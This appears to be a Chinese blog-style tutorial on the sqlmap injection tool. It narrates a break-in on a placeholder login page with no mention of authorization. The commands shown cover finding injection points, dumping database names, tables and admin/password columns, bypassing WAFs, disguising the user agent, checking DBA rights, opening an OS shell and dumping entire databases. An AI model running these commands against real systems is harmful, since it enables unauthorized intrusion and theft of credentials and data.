Sqlmap
======

注入分法不同，种类不同，来个简单的分类：<br/>

        1.get型:        sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx"
        2.post型:       sqlmap -u "http://xxx.xx.xxx/xx.xxx" --data="xxxx=xxxx&xxxx=xxx"
        3.cookie类注入: sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx" --cookie="xxx=xxx&xxx=xxx" --level=2


需要数据库好：<br/>

        --dbs
得到数据库名称xxx，需要表： <br/>

        -D xxx --tables
得到表名xxxx，需要段：<br/>

        -D xxx -T xxxx --columns
得到段内有admin，password，需要值：<br/>

        -D xxx -T xxxx -C "admin,password" --dump

那么我们来理解一下，-D -T -C 是干吗的，当然就是知道其名称，指定使用它。<br/>
--dbs --tables --columns 是干吗的，当然就是不知道名称，列出来呗<br/>
--dump 那自然就是字面意思，类似于导出数据的行为<br/>
其实注入有了上面这几个命令，妥妥的够用了，不过还需要绕waf：<br/>

        --tamper=""
注入被识别出来是工具，断开咋办：<br/>

        --user-agent=""


好，跑数据库就是这么简单，于是呢来一个稍微有点干货的例子：<br/>
```http://www.xxx.com/login.asp有post注入，我想日了,但是我不想出去拷贝post数据，很麻烦，我想让sqlmap自动跑post注入```<br/>

        sqlmap -u "http://www.xxx.com/login.asp" --forms
很好，上面的命令成功的帮我跑了post注入，并且找到了post的注入点jjj=123，于是我用的命令看看数据库<br/>

        sqlmap -u "http://www.xxx.com/login.asp" --forms -p jjj --dbs
顺便看看当前用户是不是dba<br/>

        sqlmap -u "http://www.xxx.com/login.asp" --forms -p jjj --is-dba
        sqlmap -u "http://www.xxx.com/login.asp" --forms -p jjj -a 
用了上面的命令 -a能得到什么呢：自己去看帮助吧。<br/>
帮你筛选了一下，-a下面的那些命令是用来看用户，看主机，看权限的。<br/>
我发现权限还是挺高的，同时呢，我跑出来了数据库名称kkk<br/>

        sqlmap -u "http://www.xxx.com/login.asp" --forms -p jjj -D kkk --tables
同时我找到了网站路径，然后我就又一次找到了sqlmap的牛逼的--os-xx系列命令，可以执行系统命令，同时还发现了牛逼的xpcmdshell<br/> 

        --os-shell
以及很多牛逼的文件操作命令<br/>

        --file-xx 
这些命令在需要用的时候使用就是了，会给你带来意想不到的惊喜<br/>
与此同时，我发现tables里面没有我想要的东西，我也找不到合适的内容，咋办呢，心一横，我决定把所有的数据库内容跑出来自己找，<br/>
于是我这么做：<br/>

        sqlmap -u "http://www.xxx.com/login.asp" --forms -p jjj -D kkk --dump-all
然后牛逼的sqlmap就开始跑啊跑，然后紧接着我的蛋就碎了，尼玛，sqlmap一会就问你一次要不要破解密码<br/>
，要不要这个，要不要那个，我和我的小朋友们都想擦你妹夫，功夫不负有心人，我又看见了一个命令 <br/>

        --batch 
可以自动选择sqlmap默认选项，于是，我可以和我的小朋友们玩耍去了，再也不用看着sqlmap拖库了。<br/>



总结下来，帮助文档还是很重要的，多看看，总会有些收获：<br/>
为了避免各位看英文看到吐，大概总结下：<br/>
```
* Target:       字面意思，目标，那么就是确定目标的
* Request:      字面意思，请求，就是定义请求内容的，比如post数据，http头，cookie注入，http头污染等等
* Optimization：字面意思，调节性能，等等
* Injection:    字面意思，注入的设置内容基本在这里，比如指定注入点，指定db，指定系统，等等
* Detection:    基本就是用在确认注入范围，寻找注入点区域，这些
* Technique:    基本用在确定注入手段，以及攻击方式
* Fingerprint:  基本用在指纹识别，用的很少
* Enumeration:  枚举信息，主要用在注入中，很重要，很常用
* Brute force:  用来爆破，其实主要是枚举tables columns用的
* User-defined function injection:      现在只有udf提权，以及指定一些自己定义的sqlmap脚本用，高端使用，求大牛指点
* File system access:                   主要是文件读取，文件写入
* Operating system access:              主要用在对系统操作，例如os-shell 以及 后续的连接metasploit 实现后渗透攻击
* windows registry access:              基本就是注册表操作了
* General:                              字面意思，综合的内容，一些特殊的功能实现，我在这里找到了crawl batch这些非常好用的参数
* Miscellaneous:                        目测高端应用，还没怎么用过，求大神指教
```
